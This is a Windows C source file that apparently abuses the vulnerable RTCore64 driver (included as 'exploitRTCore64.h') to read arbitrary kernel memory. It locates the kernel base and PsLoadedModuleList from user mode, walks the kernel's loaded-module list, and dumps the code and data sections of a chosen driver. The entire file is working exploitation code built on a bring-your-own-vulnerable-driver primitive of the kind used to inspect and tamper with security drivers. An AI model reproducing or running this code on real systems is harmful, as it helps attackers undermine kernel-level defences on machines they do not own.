#include <Windows.h>
#include <Psapi.h>

#include <stdio.h>

#include "utils.h"
#include "exploitRTCore64.h"
#include "helper.h"


DWORD64 OffsetPsLoadedModuleList;
DWORD64 PsLoadedModuleList;

#define BASE_DLL_NAME_BUFFER_LENGTH_WIDE BASE_DLL_NAME_BUFFER_LENGTH*2  
BOOL getModuleName(DWORD64 moduleListEntry, char* moduleName) {
    WORD baseDllNameLength;
    DWORD64 addressBaseDllNameLength = moduleListEntry + OFFSET_LDR_DATA_TABLE_ENTRY_BASE_DLL_NAME;
    if (!RTCoreReadMemory(addressBaseDllNameLength,
        (BYTE*)&baseDllNameLength, sizeof(baseDllNameLength))) return FALSE;

    DWORD64 baseDllNameBufferPtr;
    DWORD64 addressBaseDllNameBufferPtr = moduleListEntry + OFFSET_LDR_DATA_TABLE_ENTRY_BASE_DLL_NAME + OFFSET_UNICODE_STRING_BUFFER;
    if (!RTCoreReadMemory(addressBaseDllNameBufferPtr,
        (BYTE*)&baseDllNameBufferPtr, sizeof(baseDllNameBufferPtr))) return FALSE;

    wchar_t baseDllNameBuffer[BASE_DLL_NAME_BUFFER_LENGTH_WIDE] = { 0 };
    if (!RTCoreReadMemory(baseDllNameBufferPtr, (BYTE*)baseDllNameBuffer, baseDllNameLength)) return FALSE;

    if (wcstombs(moduleName, baseDllNameBuffer, sizeof(baseDllNameBuffer)) != sizeof(baseDllNameBuffer)/2) return FALSE;

    return TRUE;
}

BOOL readSections(const char* driverName) {
    DWORD64 moduleListEntry = PsLoadedModuleList;
    DWORD64 firstEntry = moduleListEntry;

    char moduleName[BASE_DLL_NAME_BUFFER_LENGTH / 2]; // because kernel uses wide strings

    do {
        getModuleName(moduleListEntry, moduleName);

        if (strstr(moduleName, driverName)) {
            printf("Found driver: %s\n", moduleName);

            DWORD64 DllBase;
            if (!RTCoreReadPTR(moduleListEntry + OFFSET_DLLBASE, &DllBase)) return FALSE; // 0x30 

            DWORD64 SizeOfImage;
            if (!RTCoreReadPTR(moduleListEntry + OFFSET_SIZEOFIMAGE, &SizeOfImage)) return FALSE; // 0x40

            printf("DllBase address: 0x%llx\n", DllBase);
            printf("Driver size: 0x%llx\n", SizeOfImage);

            IMAGE_DOS_HEADER imageDosHeader;
            if (!RTCoreReadMemory(DllBase, (BYTE*)&imageDosHeader, sizeof(imageDosHeader))) return FALSE;

            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)DllBase + imageDosHeader.e_lfanew); // 0x3cs

            USHORT number_of_sections;
            if (!RTCoreReadMemory((DWORD64)ntHeaders + OFFSET_NUMBER_OF_SECTIONS,
                (BYTE*)&number_of_sections, sizeof(number_of_sections))) return FALSE;

            DWORD64 ptrSectionHeaders = (DWORD64)ntHeaders + OFFSET_SECTION_HEADERS;

            IMAGE_SECTION_HEADER section;
            for (int i = 0; i < number_of_sections; i++) {
                if (!RTCoreReadMemory(ptrSectionHeaders + (i * sizeof(IMAGE_SECTION_HEADER)),
                    (BYTE*)&section, sizeof(IMAGE_SECTION_HEADER))) return FALSE;

                char sectionName[9] = { 0 };
                memcpy(sectionName, section.Name, SECTION_NAME_LENGTH);
                if (memcmp(section.Name, "INIT", SECTION_NAME_LENGTH) == 0 ||
                    memcmp(section.Name, ".reloc", SECTION_NAME_LENGTH) == 0) continue;

                DWORD64 sectionAddress = DllBase + section.VirtualAddress;
                BYTE* sectionContents = (BYTE*)malloc(section.SizeOfRawData);

                if (!RTCoreReadMemory(sectionAddress, sectionContents, section.SizeOfRawData)) return FALSE;

                printf("Read %s section of size: %lx bytes\n", sectionName, section.SizeOfRawData);
                displayMemoryDump(sectionContents, section.SizeOfRawData);

                free(sectionContents);
                //break; // if we are looking for only one section
            }

            break;
        }

        // Move to the next module in the list
        DWORD64 flink;
        if (!RTCoreReadPTR(moduleListEntry, &flink)) {
            return FALSE;
        }
        moduleListEntry = flink;
    } while (moduleListEntry != firstEntry); // Stop when we circle back to the first entry
    return TRUE;
}

ULONG_PTR GetAddressKernelBase() // from userspace
{
    DWORD64 pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((DWORD64*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

BOOL InitOffsetPsLoadedModuleList() // from userspace
{
    HMODULE addressNtoskrnl = NULL;
    DWORD64 addressPsLoadedModuleList = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    addressNtoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (addressNtoskrnl == NULL) return FALSE;

    addressPsLoadedModuleList = (DWORD64)GetProcAddress(addressNtoskrnl, "PsLoadedModuleList");
    if (!addressPsLoadedModuleList) {
        FreeLibrary(addressNtoskrnl);
        return FALSE;
    }
    OffsetPsLoadedModuleList = addressPsLoadedModuleList - (DWORD64)addressNtoskrnl;
    FreeLibrary(addressNtoskrnl);
    return TRUE;
}

BOOL InitPsLoadedModuleList() {
    DWORD64 addressKernelBase = GetAddressKernelBase();

    if (!addressKernelBase) return FALSE;

    if (!InitOffsetPsLoadedModuleList()) return FALSE;

    if (!RTCoreReadPTR(addressKernelBase + OffsetPsLoadedModuleList, &PsLoadedModuleList)) return FALSE;

    printf("PsLoadedModuleList is: 0x%llx", PsLoadedModuleList);
    return TRUE;
}